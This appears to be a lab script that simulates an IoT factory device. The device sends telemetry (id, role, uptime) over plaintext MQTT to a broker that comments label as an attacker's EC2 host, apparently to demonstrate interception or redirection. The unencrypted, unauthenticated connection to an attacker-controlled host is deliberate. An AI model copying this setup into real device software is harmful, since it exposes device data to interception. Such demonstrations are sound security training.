import json
import time
import paho.mqtt.client as mqtt
from device_context import DEVICE_ID, DEVICE_ROLE, WORLD, uptime

# 🔥 Attacker MQTT broker (PLAINTEXT)
IOT_ENDPOINT = "10.0.1.50"   # attacker EC2
IOT_PORT = 1883              # PLAINTEXT MQTT

# MQTT callbacks
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Successfully connected to MQTT broker (PLAINTEXT)!")
    else:
        print(f"Failed to connect. Result code: {rc}")

def on_publish(client, userdata, mid):
    print(f"Message {mid} published.")

def setup_mqtt_client():
    client = mqtt.Client(client_id=DEVICE_ID)
    client.on_connect = on_connect
    client.on_publish = on_publish
    return client

def connect_mqtt(client):
    try:
        print(f"Connecting to broker {IOT_ENDPOINT}:{IOT_PORT} (PLAINTEXT)...")
        client.connect(IOT_ENDPOINT, IOT_PORT, 60)
        client.loop_start()
        print("MQTT client connected and loop started.")
    except Exception as e:
        print(f"Failed to connect: {e}")

def publish_telemetry(client):
    while True:
        payload = {
            "device_id": DEVICE_ID,
            "role": DEVICE_ROLE,
            "world": WORLD,
            "uptime": uptime(),
            "ts": int(time.time())
        }

        topic = f"factory/{WORLD}/{DEVICE_ROLE}/{DEVICE_ID}/telemetry"
        print(f"Publishing to {topic}: {json.dumps(payload)}")

        client.publish(topic, json.dumps(payload), qos=1)
        time.sleep(5)

def main():
    client = setup_mqtt_client()
    connect_mqtt(client)
    publish_telemetry(client)

if __name__ == "__main__":
    main()
